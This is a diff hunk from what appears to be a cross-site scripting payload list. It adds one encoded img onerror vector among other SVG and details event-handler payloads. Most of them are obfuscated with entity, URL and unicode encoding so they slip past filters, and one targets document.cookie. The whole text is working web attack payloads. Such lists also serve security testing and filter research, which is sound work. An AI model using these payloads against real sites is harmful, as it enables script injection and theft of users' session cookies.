@@ -6,4 +6,5 @@
 <Svg/OnLoad=alert%25%0A26lpar;1)>
 <details/open/ontoggle=confirm('XSS')>
 <svg/oNLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
+<img src=x onerror=alert&#40)>
 <svg onload=alert&#0000000040document.cookie)>
